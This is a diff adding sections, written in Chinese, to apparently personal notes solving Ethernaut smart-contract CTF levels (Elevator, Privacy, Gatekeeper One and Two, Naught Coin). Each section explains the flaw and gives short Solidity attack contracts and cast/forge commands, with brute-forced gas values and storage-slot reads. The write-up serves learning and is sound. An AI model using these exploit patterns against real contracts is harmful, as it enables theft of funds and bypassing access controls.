@@ -173,3 +173,102 @@ contract Attack {
 }
 ```
 safemath库见 https://github.com/fractional-company/contracts/blob/master/src/OpenZeppelin/math/SafeMath.sol 。不过版本是`0.8.0`，需要修改Reentrance的版本到`0.8.0`才能使用
+
+## Elevator
+
+定义了一个接口Building，并直接将msg.sender看做接口的实现。问题是msg.sender不一定老实地实现指定的函数
+```solidity
+contract Attack {
+    bool toggle = false;
+    Elevator target = Elevator(address());
+    function isLastFloor(uint256) external returns (bool) {
+        toggle = !toggle;
+        return !toggle;
+    }
+    function exploit() public {
+        target.goTo(0);
+    }
+}
+```
+
+## Privacy
+
+类似Vault，但是变量在storage里的布局复杂了些。规律如下：
+- 变量按照声明顺序（从上到下）从 slot 0 开始依次分配
+- 每个变量占用一个完整的 slot (32字节)
+- 如果多个连续的小类型（小于32字节）变量可以放入一个 slot，编译器会按照从右到左(低位到高位)的顺序自动打包
+- 比如uint256, int256, bytes32单独占一个slot，但uint8, bool, address等类型可以多个变量共享一个slot
+
+这题的locked变量虽然是bool，但紧跟着一个uint256，只能单独占用一个slot（即使它只用1bit）
+
+ID自己一个
+
+flattening，denomination和awkwardness挤一个
+
+data是个有三个元素的bytes32数组，占三个slot
+
+然后是类型转换`bytes16(data[2]))`。solidity从较大的 bytes 类型转换为较小的 bytes 类型时，截取的是前面的字节（高位字节），而不是后面的字节
+
+```sh
+cast storage "" 5
+```
+```sh
+cast send "" "unlock(bytes16)" ""
+```
+
+## Gatekeeper One
+
+突然上难度了……
+
+gateOne和gateThree都不是什么问题。gateOne之前见过了，gateThree找个AI分析一下即可。但是这个gateTwo，要求在执行它的时候剩余的gas正好是8191的倍数。虽然调用时可以控制传递的gas数量，但怎么知道执行gasleft之前消耗了多少gas？
+
+我尝试在本地模拟了一个链。foundry自带的工具很多，在另一个终端运行anvil就能拿到本地链的rpc url和私钥。然后编写攻击脚本，不控制传递的gas，而是在调用enter前和enter后（在攻击函数中）均执行一次gasleft，看看两者的差值是多少
+```sh
+forge script script/Attack.s.sol:AttackScript \
+    --fork-url http://localhost:8545 \
+    --private-key "" \
+    --broadcast
+```
+得到265。不对。到底是多少？看了[别人](https://www.cnblogs.com/WZM1230/p/18754096)的记录，正确答案是256（马后炮一下，可能是我调用函数和测量时额外多用了一些gas？或是因为这个方法只能精确到某个语句，精确不到指令？）
+
+那就爆破吧。往前挪一下起始值，爆破`8191*10+i`，用try-catch捕捉失败的require。脚本执行成功，顺利得到256。但是submit instance发现entrant没更新？这我真不知道为啥了，try没有捕捉到错误说明三个gate中的require都通过了，enter本身也没什么好出错的。看了别人的脚本，和我逻辑差不多啊，只是没有将爆破和调用放在一个函数里，而是分成了两个函数，通过传递参数的方式制定gas。这总不会是原因吧？得试一下佬的脚本
+```solidity
+contract Attack {
+    function test(address addr, uint256 gas) public {
+        GatekeeperOne go = GatekeeperOne(addr);
+        bytes8 key = bytes8(uint64(uint160(tx.origin) & 0xFFFFFFFF0000FFFF));
+        require(go.enter{gas: 8191 * 10 + gas}(key), "failed");
+    }
+    function exploit(address addr) public {
+        for(uint256 i = 1; i < 8191; i++){
+            try this.test(addr, i) {
+                console.log(i);
+                break;
+            } catch {}
+        }
+    }
+}
+```
+……成功了，但输出同样是256。不是，这是为啥啊？
+
+## Gatekeeper Two
+
+extcodesize不会计入合约的构造函数，因此在构造函数里执行攻击即可
+```solidity
+contract Attack {
+    constructor() {
+        GatekeeperTwo target=GatekeeperTwo(address());
+        target.enter(bytes8(type(uint64).max^uint64(bytes8(keccak256(abi.encodePacked(address(this)))))));
+    }
+}
+```
+## Naught Coin
+
+ERC20的文档： https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md
+
+题目覆盖了transfer的实现，但是还有个`transferFrom(address _from, address _to, uint256 _value)`可以转账。使用前需要用approve指定足够的allowance给from（即使是自己）
+```sh
+cast call "" "balanceOf(address)" ""
+cast send "" "function approve(address, uint256)" "" 0xd3c21bcecceda1000000 
+cast send "" "transferFrom(address,address,uint256)" "" "" 0xd3c21bcecceda1000000
+```
